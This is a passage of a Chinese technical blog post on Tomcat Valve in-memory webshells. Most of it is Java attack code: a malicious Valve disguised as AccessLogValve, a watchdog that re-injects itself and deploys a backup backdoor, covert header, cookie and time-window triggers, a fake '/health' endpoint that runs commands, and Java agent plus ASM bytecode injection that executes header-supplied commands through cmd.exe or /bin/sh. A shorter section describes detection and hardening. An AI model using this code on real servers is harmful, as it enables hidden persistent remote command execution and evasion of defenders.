class="hljs-keyword">set</span>(pipeline, newValves);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="三、高级隐蔽技术"><a href="#三、高级隐蔽技术" class="headerlink" title="三、高级隐蔽技术"></a>三、高级隐蔽技术</h3><p><strong>1. Valve伪装技术</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 继承官方Valve类，减少特征</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AccessLogValveProxy</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AccessLogValve</span> &#123;<br>    <br>    <span class="hljs-keyword">private</span> Valve original;<br>    <span class="hljs-keyword">private</span> Valve malicious;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AccessLogValveProxy</span><span class="hljs-params">(Valve original)</span> &#123;<br>        <span class="hljs-built_in">this</span>.original = original;<br>        <span class="hljs-built_in">this</span>.malicious = createMaliciousValve();<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> &#123;<br>        <span class="hljs-comment">// 恶意逻辑检查</span><br>        <span class="hljs-keyword">if</span> (isMaliciousRequest(request)) &#123;<br>            malicious.invoke(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// 正常逻辑</span><br>        original.invoke(request, response);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 替换原始Valve</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">replaceOriginalValve</span><span class="hljs-params">(Pipeline pipeline)</span> &#123;<br>        Valve[] valves = pipeline.getValves();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; valves.length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (valves[i] <span class="hljs-keyword">instanceof</span> AccessLogValve) &#123;<br>                valves[i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AccessLogValveProxy</span>(valves[i]);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-自保护机制"><a href="#2-自保护机制" class="headerlink" title="2. 自保护机制"></a>2. 自保护机制</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 在Valve中添加自检和恢复逻辑</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> &#123;<br>    <span class="hljs-comment">// 1. 检查自身是否仍在管道中</span><br>    <span class="hljs-keyword">if</span> (!isValveInPipeline(<span class="hljs-built_in">this</span>)) &#123;<br>        reinjectSelf(); <span class="hljs-comment">// 重新注入</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// 2. 检查其他内存马是否存在</span><br>    <span class="hljs-keyword">if</span> (!isBackdoorPresent()) &#123;<br>        deploySecondaryBackdoor(); <span class="hljs-comment">// 部署备用后门</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// 3. 正常恶意逻辑...</span><br>&#125;<br><br><span class="hljs-comment">// 定时检查线程</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startWatchdog</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>            checkValveStatus();<br>            checkSecurityTools();<br>            Thread.sleep(<span class="hljs-number">300000</span>); <span class="hljs-comment">// 5分钟检查一次</span><br>        &#125;<br>    &#125;).start();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-上下文感知触发"><a href="#3-上下文感知触发" class="headerlink" title="3. 上下文感知触发"></a>3. 上下文感知触发</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 基于请求上下文动态激活</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">shouldActivate</span><span class="hljs-params">(Request request)</span> &#123;<br>    <span class="hljs-comment">// 1. 检查特定Header</span><br>    <span class="hljs-keyword">if</span> (request.getHeader(<span class="hljs-string">&quot;X-Health-Check&quot;</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <br>    <span class="hljs-comment">// 2. 检查特殊URL模式</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI();<br>    <span class="hljs-keyword">if</span> (uri.contains(<span class="hljs-string">&quot;;jsessionid=&quot;</span>)) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">sessionPart</span> <span class="hljs-operator">=</span> uri.split(<span class="hljs-string">&quot;;&quot;</span>)[<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">return</span> validateSessionToken(sessionPart);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 3. 检查特定Cookie值</span><br>    Cookie[] cookies = request.getCookies();<br>    <span class="hljs-keyword">for</span> (Cookie cookie : cookies) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;debug_mode&quot;</span>.equals(cookie.getName())) &#123;<br>            <span class="hljs-keyword">return</span> checkCookieSignature(cookie.getValue());<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 4. 时间窗口激活</span><br>    <span class="hljs-type">long</span> <span class="hljs-variable">currentTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>    <span class="hljs-keyword">return</span> (currentTime % <span class="hljs-number">60000</span>) &lt; <span class="hljs-number">5000</span>; <span class="hljs-comment">// 每分钟激活5秒</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="四、检测与防御方案"><a href="#四、检测与防御方案" class="headerlink" title="四、检测与防御方案"></a>四、检测与防御方案</h3><p><strong>检测技术</strong></p>
+<ol>
+<li><p><strong>运行时管道分析</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">monitorValves</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> getCurrentContext();<br>    <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> ctx.getPipeline();<br>    Valve[] valves = pipeline.getValves();<br><br>    <span class="hljs-keyword">for</span> (Valve valve : valves) &#123;<br>        <span class="hljs-comment">// 检测未签名的Valve</span><br>        <span class="hljs-keyword">if</span> (!isSigned(valve.getClass())) &#123;<br>            alertSuspiciousValve(valve);<br>        &#125;<br><br>        <span class="hljs-comment">// 检测类加载来源</span><br>        <span class="hljs-keyword">if</span> (valve.getClass().getClassLoader() != ctx.getLoader().getClassLoader()) &#123;<br>            alertForeignClassLoader(valve);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>字节码校验技术</strong></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># 使用jvmti代理进行类校验</span><br><span class="hljs-keyword">java </span>-agentpath:valve_checker.so=<span class="hljs-keyword">org.apache.catalina.core.StandardPipeline </span>...<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p><strong>防御策略</strong></p>
+<ol>
+<li><p><strong>Tomcat配置加固</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- context.xml --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Context</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Valve</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.ValveSecurityFilter&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">allowedValves</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.*&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Context</span>&gt;</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>运行时保护机制</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ValveProtectionAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String args, Instrumentation inst)</span> &#123;<br>        inst.addTransformer((loader, className, classBeingRedefined, <br>                protectionDomain, classfileBuffer) -&gt; &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;org/apache/catalina/core/StandardPipeline&quot;</span>.equals(className)) &#123;<br>                <span class="hljs-keyword">return</span> patchPipelineClass(classfileBuffer);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] patchPipelineClass(<span class="hljs-type">byte</span>[] original) &#123;<br>        <span class="hljs-comment">// 使用ASM添加管道修改检查</span><br>        <span class="hljs-type">ClassReader</span> <span class="hljs-variable">cr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassReader</span>(original);<br>        <span class="hljs-type">ClassWriter</span> <span class="hljs-variable">cw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassWriter</span>(cr, ClassWriter.COMPUTE_FRAMES);<br>        cr.accept(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PipelineCheckAdapter</span>(cw), <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> cw.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>权限最小化</strong></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># 启动脚本添加JVM参数<br>-Djava.<span class="hljs-keyword">security</span>.manager \<br>-Djava.<span class="hljs-keyword">security</span>.<span class="hljs-keyword">policy</span>=tomcat.<span class="hljs-keyword">policy</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>tomcat.policy内容</strong>:</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">grant codeBase <span class="hljs-string">&quot;file:$&#123;catalina.home&#125;/webapps/yourapp/-&quot;</span> &#123;<br>    // 禁止Valve修改权限<br>    permission java.lang.reflect.ReflectPermission <span class="hljs-string">&quot;suppressAccessChecks&quot;</span><span class="hljs-comment">;</span><br>    permission java.lang.RuntimePermission <span class="hljs-string">&quot;accessClassInPackage.org.apache.catalina.core&quot;</span><span class="hljs-comment">;</span><br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="五、混合注入的演进趋势"><a href="#五、混合注入的演进趋势" class="headerlink" title="五、混合注入的演进趋势"></a>五、混合注入的演进趋势</h3><ol>
+<li><p><strong>模块化加载</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> &#123;<br>    <span class="hljs-keyword">if</span> (isTriggerRequest(request)) &#123;<br>        <span class="hljs-comment">// 动态加载加密模块</span><br>        <span class="hljs-type">byte</span>[] encryptedModule = fetchModule(request.getParameter(<span class="hljs-string">&quot;m&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">module</span> <span class="hljs-operator">=</span> loadModule(encryptedModule);<br>        executeModule(<span class="hljs-keyword">module</span>, request, response);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    getNext().invoke(request, response);<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>云环境适配</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 检测云环境并调整行为</span><br><span class="hljs-keyword">if</span> (isRunningInCloud()) &#123;<br>    activateCloudBackdoor();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    activateTraditionalBackdoor();<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>API网关集成</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 伪装成合法的健康检查端点</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;/health&quot;</span>.equals(request.getRequestURI())) &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">action</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;action&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;exec&quot;</span>.equals(action)) &#123;<br>        executeCommand(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        sendHealthStatus(response); <span class="hljs-comment">// 返回正常状态</span><br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Tomcat Valve型内存马的混合注入方式代表了当前高级威胁的典型手法：</p>
+<ol>
+<li><strong>API与反射的精准结合</strong>- 在保持隐蔽性的同时提高可靠性</li>
+<li><strong>上下文感知的攻击逻辑</strong>- 基于环境动态调整行为</li>
+<li><strong>多层防御规避</strong>- 从类加载到管道操作全面伪装</li>
+</ol>
+<h2 id="Agent-ASM-Javassist-字节码注入"><a href="#Agent-ASM-Javassist-字节码注入" class="headerlink" title="Agent + ASM&#x2F;Javassist 字节码注入"></a>Agent + ASM&#x2F;Javassist 字节码注入</h2><h3 id="一、攻击流程详解"><a href="#一、攻击流程详解" class="headerlink" title="一、攻击流程详解"></a>一、攻击流程详解</h3><p><strong>阶段1：Agent注入（JVM渗透）</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取目标Tomcat进程PID</span><br>List&lt;VirtualMachineDescriptor&gt; vms = VirtualMachine.list();<br><span class="hljs-keyword">for</span> (VirtualMachineDescriptor vmd : vms) &#123;<br>    <span class="hljs-keyword">if</span> (vmd.displayName().contains(<span class="hljs-string">&quot;catalina&quot;</span>)) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">pid</span> <span class="hljs-operator">=</span> vmd.id();<br>        <br>        <span class="hljs-comment">// 动态加载Agent</span><br>        <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">vm</span> <span class="hljs-operator">=</span> VirtualMachine.attach(pid);<br>        vm.loadAgent(<span class="hljs-string">&quot;/path/to/agent.jar&quot;</span>, <span class="hljs-string">&quot;injection_params&quot;</span>);<br>        vm.detach();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>阶段2：Agent核心逻辑</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String args, Instrumentation inst)</span> &#123;<br>        inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CriticalClassTransformer</span>());<br>    &#125;<br>    <br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CriticalClassTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Set&lt;String&gt; TARGET_CLASSES = Set.of(<br>            <span class="hljs-string">&quot;org.apache.catalina.core.StandardPipeline&quot;</span>,<br>            <span class="hljs-string">&quot;org.apache.catalina.core.StandardContextValve&quot;</span>,<br>            <span class="hljs-string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span><br>        );<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className,<br>                               Class&lt;?&gt; classBeingRedefined,<br>                               ProtectionDomain protectionDomain,<br>                               <span class="hljs-type">byte</span>[] classfileBuffer) &#123;<br>            <br>            <span class="hljs-type">String</span> <span class="hljs-variable">dotClassName</span> <span class="hljs-operator">=</span> className.replace(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>            <span class="hljs-keyword">if</span> (TARGET_CLASSES.contains(dotClassName)) &#123;<br>                <span class="hljs-keyword">return</span> modifyClass(dotClassName, classfileBuffer);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="二、字节码修改技术（ASM核心实现）"><a href="#二、字节码修改技术（ASM核心实现）" class="headerlink" title="二、字节码修改技术（ASM核心实现）"></a>二、字节码修改技术（ASM核心实现）</h3><p><strong>1. StandardPipeline类修改</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] modifyStandardPipeline(<span class="hljs-type">byte</span>[] origBytecode) &#123;<br>    <span class="hljs-type">ClassReader</span> <span class="hljs-variable">cr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassReader</span>(origBytecode);<br>    <span class="hljs-type">ClassWriter</span> <span class="hljs-variable">cw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassWriter</span>(cr, ClassWriter.COMPUTE_FRAMES);<br>    <br>    cr.accept(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassVisitor</span>(Opcodes.ASM9, cw) &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> MethodVisitor <span class="hljs-title function_">visitMethod</span><span class="hljs-params">(<span class="hljs-type">int</span> access, String name, </span><br><span class="hljs-params">                                        String desc, String signature, </span><br><span class="hljs-params">                                        String[] exceptions)</span> &#123;<br>            <br>            <span class="hljs-type">MethodVisitor</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);<br>            <br>            <span class="hljs-comment">// 在invoke方法中植入钩子</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;invoke&quot;</span>.equals(name) &amp;&amp; <br>                <span class="hljs-string">&quot;(Lorg/apache/catalina/connector/Request;Lorg/apache/catalina/connector/Response;)V&quot;</span>.equals(desc)) &#123;<br>                <br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodVisitor</span>(Opcodes.ASM9, mv) &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visitCode</span><span class="hljs-params">()</span> &#123;<br>                        <span class="hljs-comment">// 在方法开始处插入检测逻辑</span><br>                        mv.visitVarInsn(Opcodes.ALOAD, <span class="hljs-number">1</span>);  <span class="hljs-comment">// 加载Request</span><br>                        mv.visitMethodInsn(Opcodes.INVOKESTATIC, <br>                                          <span class="hljs-string">&quot;com/evil/EmbeddedLogic&quot;</span>, <br>                                          <span class="hljs-string">&quot;checkRequest&quot;</span>, <br>                                          <span class="hljs-string">&quot;(Lorg/apache/catalina/connector/Request;)Z&quot;</span>, <br>                                          <span class="hljs-literal">false</span>);<br>                        <br>                        <span class="hljs-type">Label</span> <span class="hljs-variable">skipLabel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>();<br>                        mv.visitJumpInsn(Opcodes.IFEQ, skipLabel);<br>                        <br>                        <span class="hljs-comment">// 如果是恶意请求，直接返回</span><br>                        mv.visitInsn(Opcodes.RETURN);<br>                        <br>                        mv.visitLabel(skipLabel);<br>                        <span class="hljs-built_in">super</span>.visitCode();<br>                    &#125;<br>                &#125;;<br>            &#125;<br>            <span class="hljs-keyword">return</span> mv;<br>        &#125;<br>    &#125;, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">return</span> cw.toByteArray();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>2. 嵌入式恶意逻辑类</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmbeddedLogic</span> &#123;<br>    <span class="hljs-comment">// 请求检测逻辑</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkRequest</span><span class="hljs-params">(Request request)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">trigger</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;X-Health-Check&quot;</span>);<br>        <span class="hljs-keyword">if</span> (trigger != <span class="hljs-literal">null</span> &amp;&amp; trigger.startsWith(<span class="hljs-string">&quot;v1-&quot;</span>)) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> trigger.substring(<span class="hljs-number">3</span>);<br>            executeCommand(cmd, request.getResponse());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 命令执行逻辑（多平台兼容）</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(String cmd, Response response)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            String[] commands;<br>            <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                commands = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                commands = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;<br>            &#125;<br>            <br>            <span 